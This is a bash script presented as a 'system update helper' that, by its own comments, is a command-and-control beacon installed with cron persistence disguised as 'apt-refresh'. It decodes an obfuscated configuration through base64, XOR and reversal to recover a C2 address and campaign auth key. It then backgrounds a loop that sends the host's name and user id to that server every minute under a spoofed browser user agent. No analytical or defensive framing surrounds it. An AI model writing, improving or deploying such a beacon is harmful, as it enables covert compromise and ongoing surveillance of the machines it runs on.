#!/bin/bash
# .update.sh  --  "system update helper"   (this is the C2 beacon)
# installed 0x1F ; persistence via /etc/cron.d/apt-refresh
set -e
BEACON_ID="0x1F"
UA="Mozilla/5.0 (X11; Linux x86_64) AppUpdater/1.4"

# --- obfuscated C2 profile ----------------------------------------------------------
# The operator built the profile with:   base64( xor( reverse( base64(json) ), KEY ) )
# so we undo it here with:               base64 -d | xor KEY | rev | base64 -d
KEY="tibeb"
CFG="SVQzAwsxEy8RKyAkFjwIOR4rDytCIDE/UjIuOAMaMwsSEQ89Gis2BB8nJj8VOVsvDlsYCxUoJToTK1c6DSRQPQk6EwFVK0YMJTdTJQA0CDsEOwwsVD06BwkWRjENNzoQASgmLkUsCCoLPTE4VTAsCBMvITgeOw8tHSg6Pw4MWwEMFR0gFQ0lFxw3IgYcDVApGCUtLFENMCQaIAg4WTsxLwEwJisaQDosVVoNJVQkKhBZCggrQiALKAg+Ki4MOyEkVicIPV8rDAAaBTU8FUU+Ow8oDQw="

deobf() {
    printf '%s' "$CFG" | base64 -d \
    | python3 -c 'import sys;k=b"tibeb";d=sys.stdin.buffer.read();sys.stdout.buffer.write(bytes(c^k[i%len(k)] for i,c in enumerate(d)))' \
    | rev \
    | base64 -d
}

beacon() {
    local conf c2 auth
    conf="$(deobf)"
    c2="$(printf '%s' "$conf"   | sed -n 's/.*"c2":"\([^"]*\)".*/\1/p')"
    auth="$(printf '%s' "$conf" | sed -n 's/.*"auth_key":"\([^"]*\)".*/\1/p')"
    # check in to the C2 with the campaign auth key, then idle
    while true; do
        curl -s -A "$UA" -H "X-Auth: ${auth}" \
             --data "id=$(hostname)&uid=$(id -u)" "$c2" >/dev/null 2>&1 || true
        sleep 60
    done
}

beacon &
disown 2>/dev/null || true
exit 0
